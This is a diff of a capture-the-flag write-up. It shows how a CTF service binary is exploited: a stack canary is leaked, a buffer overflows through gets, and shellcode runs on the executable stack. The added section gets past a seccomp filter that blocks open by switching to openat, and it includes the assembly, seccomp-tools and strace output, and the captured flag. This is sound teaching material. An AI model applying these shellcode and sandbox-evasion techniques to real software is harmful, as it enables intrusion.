@@ -90,7 +90,7 @@ EXPOSE 3000
 
 Clearly, the flag is stored in `app/compartment.txt`, which is owned by the user `yakitori`. The service runs as `yakitori` as well, so if we can exploit the binary to read the file, we can get the flag.
 
-For purposes of local testing, I created an `app/compartment.txt` file with the contents `CTF{flag}`.
+For purposes of local testing, I created an `app/compartment.txt` file with the contents `ctf{flag}`.
 
 ## Understanding the program
 
@@ -225,13 +225,13 @@ pwndbg> x/4x $rbp-0x8
 0x7fffffffdc48: 0xfc6cb400      0xb6fbf3c3      0xffffdc60      0x00007fff
 ```
 
+The value stored at `rbp-0x8` is `0xb6fbf3c3fc6cb400`, which is exactly the same as what was printed. So we have confirmed that the second address printed is the canary.
+
 ::ProseAlert
 By running `x/4x $rbp-0x8`, we are telling gdb to show us the memory at `$rbp-0x8`. This is equivalent to `[rbp-0x8]`.
 
 If we were to run `p $rbp-0x8`, we would merely get the result of `$rbp-0x8`, which is an address only.
 ::
-
-Indeed, the value stored at `rbp-0x8` is `0xb6fbf3c3fc6cb400`, which is exactly the same as what was printed. So we have confirmed that the second address printed is the canary.
 
 If we break at `fun+143`, which right at the `gets` call then continue running the function:
 
@@ -255,7 +255,7 @@ We'll be using [pwntools](https://docs.pwntools.com/en/stable/) to write the exp
 
 Since the stack is executable, the easiest way to read the file is to use shellcode.
 
-The below boilerplate (written in nasm) will allow us to print the contents of `/flag.txt`
+The below boilerplate (written in nasm) will allow us to print the contents of `/flag.txt`.
 
 ```asm [shellcode.s]
 .global _start
@@ -395,3 +395,101 @@ payload = shellcode + b'a'*(0x88-len(shellcode)) + leaked_canary + b'b'*(0x10-8)
 ```
 
 The shellcode should execute. However...
+
+```ansi [Pdbg output]
+[*] Switching to interactive mode
+
+[*] Got EOF while reading in interactive
+$
+[*] Interrupted
+[*] Process './service' stopped with exit code -31 (SIGSYS) (pid 64943)
+```
+
+There is an error: `SIGSYS`. I hadn't encountered this before, so I had to look it up. [This is what I found](<https://en.wikipedia.org/wiki/Signal_(IPC)>).
+::ProseImg{src="sigsys" alt="sigsys_wiki"}
+::
+
+### Solving Seccomp
+
+Apparently, `SIGSYS` is sent when either there are bad arguments or a disallowed system call from the Linux Seccomp is made.
+
+::ProseAlert{mode="warning"}
+Linux Seccomp is a security feature that restricts the system calls a process can make. If a process tries to make a system call that is not allowed by its Seccomp profile, the kernel will send it a `SIGSYS` signal, which typically results in the process being terminated.
+::
+
+To inspect the Seccomp profile, we can use [seccomp-tools](https://github.com/david942j/seccomp-tools).
+
+```ansi [seccomp-tools output]
+└─$ seccomp-tools dump ./service
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
+ 0002: 0x06 0x00 0x00 0x00000000  return KILL
+ 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0004: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0006
+ 0005: 0x06 0x00 0x00 0x00000000  return KILL
+ 0006: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0008
+ 0007: 0x06 0x00 0x00 0x00000000  return KILL
+ 0008: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0010
+ 0009: 0x06 0x00 0x00 0x00000000  return KILL
+ 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+```
+
+From this, we can see that when `execve` is called, the program goes to line `0007`, which kills the program. Similar things occur when `open` is called. Since our shellcode includes `open`, we just need to avoid that.
+
+An alternative of the `open` syscall is to use `syscall` `257`, which is `openat`. This syscall opens a file relative to a directory file descriptor.
+
+Unlike `open`, [openat](https://linux.die.net/man/2/openat) receives a directory file descriptor as the first argument, since it directs the kernel to open the file at a specific directory. All other arguments are shifted back by one register.
+
+Modifying our shellcode, we simply need to set the first argument to `AT_FDCWD`, which is `0xffffff9c` in hex, to indicate that the path is relative to the current working directory.
+
+```asm [solve.py]
+custom_assembly="""
+...
+mov rbx, 0x000000007478742e ; .txt\x00
+push rbx
+
+mov rbx, 0x746e656d74726170 ; partment
+push rbx
+
+mov rbx, 0x6d6f632f7070612f ; /app/com
+push rbx
+mov rsi, rsp
+
+mov rdi, 0xFFFFFF9C
+mov rdx, 0 ; O_RDONLY flag
+mov r10, 0 ; mode, ignored for O_RDONLY
+mov rax, 257 ; syscall number for openat
+syscall
+...
+"""
+shellcode = asm(custom_assembly)
+```
+
+We can check if our shellcode works by putting the shellcode in a file called shellcode.s, compiling it into an ELF file, then using `strace` to the syscalls made.
+
+````ansi [Terminal]
+gcc -nostdlib -static shellcode.s -o shellcode-elf
+strace ./shellcode-elf
+
+execve("./shellcode-elf", ["./shellcode-elf"], 0x7ffe3d1e5d50 /* 64 vars */) = 0
+openat(AT_FDCWD, "/app/compartment.txt", O_RDONLY) = 3
+read(3, "ctf{flag}\n", 100)             = 10
+write(1, "ctf{flag}\n", 10ctf{flag}
+)             = 10
+exit(0)                                 = ?
++++ exited with 0 +++
+```
+From the fact that the write seems to have written `ctf{flag}` out to the terminal, our shellcode works as intended.
+
+Now, running the exploit in remote:
+
+```ansi [Terminal]
+[*] Switching to interactive mode
+
+[*] Process './service' stopped with exit code 0 (pid 85879)
+cuhk25ctf{Secr3t_C0mpu71ng_1n_S3cure_C0mpartm3n7}
+````
+
+We've got the flag: `cuhk25ctf{Secr3t_C0mpu71ng_1n_S3cure_C0mpartm3n7}`!
